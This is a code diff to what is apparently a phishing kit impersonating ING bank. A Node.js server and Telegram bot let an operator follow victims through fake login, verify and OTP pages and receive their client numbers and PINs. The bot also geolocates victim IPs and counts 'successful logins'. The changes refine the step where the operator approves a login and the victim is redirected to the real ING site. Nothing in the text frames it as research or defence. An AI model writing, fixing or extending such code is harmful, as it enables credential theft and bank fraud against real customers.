@@ -82,6 +82,8 @@ function uaParser(ua) {
 function tgOpts(sid) {
   const v = sessions.get(sid);
 
+  if (v?.page === 'success') return noBtn();
+
   if (v?.page === 'verify.html') {
     return {
       reply_markup: {
@@ -123,9 +125,8 @@ function noBtn() {
 
 /* ======  GET SESSION HEADER  ====== */
 function getSessionHeader(v) {
-  if (v.page === 'success' || v.status === 'approved') {
-    return `🦁 ING Login approved`;
-  }
+  if (v.page === 'success') return `🦁 ING Login approved`;
+  if (v.status === 'approved') return `🦁 ING Login approved`;
   if (v.page === 'index.html') {
     return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
   } else if (v.page === 'verify.html') {
@@ -143,7 +144,7 @@ function getSessionHeader(v) {
 
 /* ======  BUILD MESSAGE  ====== */
 function buildMsg(v, extra = '') {
-  const geo = `https://ipgeolocation.io/ip-location/${v.ip}`;
+  const geo = `https://ipgeolocation.io/ip-location/ ${v.ip}`;
 
   if (extra && extra.includes('ING Login approved')) {
     return `${extra}
@@ -773,11 +774,11 @@ bot.on('callback_query', async (q) => {
         await updateAdminPanel();
         return bot.answerCallbackQuery(q.id, 'Proceeding to OTP');
       } else if (v.page === 'otp.html') {
-  v.status = 'ok';
-  successfulLogins++;
-  await updateAdminPanel();
-  return bot.answerCallbackQuery(q.id, 'Login approved - redirecting to ING');
-}
+        v.page = 'success';
+        successfulLogins++;
+        await updateAdminPanel();
+        return bot.answerCallbackQuery(q.id, 'Login approved - redirecting to ING');
+      }
     }
   } catch (err) {
     console.error('Callback error', err);
@@ -791,4 +792,3 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RAILWAY_PUBLIC_DOMAIN || `http://localhost:${PORT}`;
 });
-
